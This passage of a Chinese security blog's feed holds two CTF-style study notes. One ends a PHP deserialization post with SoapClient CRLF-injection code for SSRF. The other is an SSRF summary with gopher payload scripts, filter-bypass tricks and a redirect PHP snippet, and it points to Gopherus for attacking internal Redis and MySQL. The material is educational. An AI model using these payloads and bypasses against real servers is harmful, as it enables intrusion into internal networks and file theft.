class="hljs-keyword">bool</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__soapCall</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>,<br>    <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span>,<br>    ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = <span class="hljs-literal">null</span>,<br>    SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$inputHeaders</span> = <span class="hljs-literal">null</span>,<br>    <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$outputHeaders</span> = <span class="hljs-literal">null</span><br>): <span class="hljs-keyword">mixed</span><br>&#125;<br></code></pre></td></tr></table></figure><p>先从手册中看soap的构造方法，可以看到有两个参数，第一个参数<code>$wsdl</code>用来指明是否为wsdl模式，第二个参数<code>$options</code>是一个数组。<br>当在第一个参数中指明了wsdl模式后，第二个参数是可选的，可以没有；当第一个参数设置为非wsdl模式后，第二个参数中必须设置uri和location选项。location就是目标url，uri是soap服务的命令空间</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-6.png"></p><p>再看__call()方法，当调用类中不存在的方法时就会触发，当触发这个方法后，它就会向location中的目标URL发送一个soap请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://20.2.129.79:7777&#x27;</span>));<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br></code></pre></td></tr></table></figure><p>在vps上监听对应的端口</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-7.png"></p><p>可以接收到一个post请求，并且<code>SOAPAction</code>的值明显是可控的，那么利用crlf我们就能控制数据包了</p><p>比如插入一个cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;aaa^^Cookie: test=123^^&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://20.2.129.79:7777&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-8.png"></p><p>但是对于POST数据包，还存在一个问题，即Content-Type的值，默认是text&#x2F;xml，我们修改的SOAPAction在Content-Type的下面，无法控制Content-Type，也就不能控制POST的数据</p><p>在header里User-Agent在Content-Type前面，手册中也提到了如何设置User-Agent，我们可以在User-Agent中注入crlf，从而控制Content-Type的值</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-9.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&quot;data=abc&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;Mozilla/5.0^^Content-Type: application/x-www-form-urlencoded^^Content-Length: &#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_data</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://20.2.129.79:7777&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-comment">//echo urlencode($b);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>还需要在结尾设置一个Content-Length，一方面对于post包是必须的，另一方面还能让多余的数据丢弃，不影响我们设定的值</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-10.png"></p><p>这样就能实现soapclient+crlf组合拳攻击ssrf了</p><hr><p>参考文章:<br><a href="https://blog.csdn.net/mochu7777777/article/details/106909777">由浅入深理解PHP反序列化漏洞</a><br><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHP反序列化总结</a><br><a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常见的魔术方法&quot;&gt;&lt;a href=&quot;#常见的魔术方法&quot; class=&quot;headerlink&quot; title=&quot;常见的魔术方法&quot;&gt;&lt;/a&gt;常见的魔术方法&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="php" scheme="https://www.dr0n.top/tags/php/"/>
    
    <category term="反序列化" scheme="https://www.dr0n.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ssrf学习总结</title>
    <link href="https://www.dr0n.top/posts/76604b1a/"/>
    <id>https://www.dr0n.top/posts/76604b1a/</id>
    <published>2023-02-05T04:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p><h1 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h1><p>下面是几个可能会存在SSRF的服务器使用的函数：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。<br>readfile()：输出一个文件的内容。<br>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。<br>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。<br>fopen()：打开一个文件文件或者 URL。<br></code></pre></td></tr></table></figure><p>example:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);  <span class="hljs-comment">//创造一个curl资源</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">//设置url和相应的选项</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">// 抓取url并将其传递给浏览器</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">//关闭curl资源</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="常用协议"><a href="#常用协议" class="headerlink" title="常用协议"></a>常用协议</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>http协议用于访问内网资源&#x2F;扫描内网存活主机</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-1.png"></p><h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>可以通过dict协议根据响应时间和内容去扫描内网开放端口以及端口上运行的服务信息</p><p>example:<br><code>dict://127.0.0.1:6379 //探测redis是否存活</code></p><h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>file协议主要用于访问本地计算机的文件，在有回显的情况下，可以用于读取文件进行查看</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-2.png"></p><h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><p>格式：<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;</code></p><p>如果发起<code>post</code>请求，回车换行需要使用<code>%0d%0a</code>，如果多个参数，参数之间的<code>&amp;</code>也需要进行<code>URL</code>编码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-3.png"></p><p>通过脚本转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /test.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 36</span><br><span class="hljs-string"></span><br><span class="hljs-string">test=1</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment">#注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br>result = urllib.parse.quote(result)<br><span class="hljs-built_in">print</span>(result)       <span class="hljs-comment"># 这里因为是GET请求所以要进行两次url编码</span><br></code></pre></td></tr></table></figure><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>攻击内网<code>Redis</code>，<code>FastCGI</code>，<code>MySql</code>等服务</p><p><a href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></p><p>利用<a href="https://github.com/tarunkant/Gopherus">Gopherus</a>工具</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">MySQL (Port-3306)<br>PostgreSQL(Port-5432)<br>FastCGI (Port-9000)<br>Memcached (Port-11211)<br>    If stored data is getting De-serialized by:<br>        Python<br>        Ruby<br>        PHP<br>Redis (Port-6379)<br>Zabbix (Port-10050)<br>SMTP (Port-25)<br></code></pre></td></tr></table></figure><h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="ip限制"><a href="#ip限制" class="headerlink" title="ip限制"></a>ip限制</h2><p>例如限制了<code>127/172</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">进制转换<br>10进制 http://2130706433<br>8进制 http://017700000001<br>16进制  http://0x7F000001<br><br>长度限制<br>host&lt;5<br>url=http://0/flag.php<br>url=http://127.1/flag.php<br><br>host&lt;3<br>url=http://0/flag.php  //在window下代表0.0.0.0，而在liunx下代表127.0.0.1<br></code></pre></td></tr></table></figure><h2 id="url限制"><a href="#url限制" class="headerlink" title="url限制"></a>url限制</h2><blockquote><p>解析到内网的域名</p></blockquote><p><code>xip.io</code>、<code>xip.name</code>、<code>nip.io</code>、<code>sslip.io</code>等</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.0.1.xip.io &gt;&gt;&gt; 192.168.0.1<br>localhost &gt;&gt;&gt; 127.0.0.1<br></code></pre></td></tr></table></figure><blockquote><p>利用@转跳</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://www.baidu.com@10.10.10.10 &gt;&gt;&gt; http://10.10.10.10<br></code></pre></td></tr></table></figure><blockquote><p>利用句号</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">127。0。0。1  &gt;&gt;&gt;  127.0.0.1<br></code></pre></td></tr></table></figure><blockquote><p>利用IPv6[::]</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1<br>http://[0:0:0:0:0:ffff:127.0.0.1]/    //在liunx下可用<br></code></pre></td></tr></table></figure><blockquote><p>利用短网址</p></blockquote><p>不允许出现某个字母或者限制了url长度，我们可以切换为短网址，来绕过长度的限制</p><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>vps上放个php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$schema</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-variable">$ip</span>     = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;i&#x27;</span>];<br><span class="hljs-variable">$port</span>   = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-variable">$query</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$port</span>))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>/<span class="hljs-subst">$query</span>&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>/<span class="hljs-subst">$query</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="enclosed-alphanumerics-绕过"><a href="#enclosed-alphanumerics-绕过" class="headerlink" title="enclosed alphanumerics 绕过"></a>enclosed alphanumerics 绕过</h2><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com<br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ  Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<br></code></pre></td></tr></table></figure><h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p><a href="https://xz.aliyun.com/t/7495">从0到1认识DNS重绑定攻击</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ssrf&quot;&gt;&lt;a href=&quot;#ssrf&quot; class=&quot;headerlink&quot; title=&quot;ssrf&quot;&gt;&lt;/a&gt;ssrf&lt;/h1&gt;&lt;p&gt;服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="ssrf" scheme="https://www.dr0n.top/tags/ssrf/"/>
    
  </entry>
  
</feed>
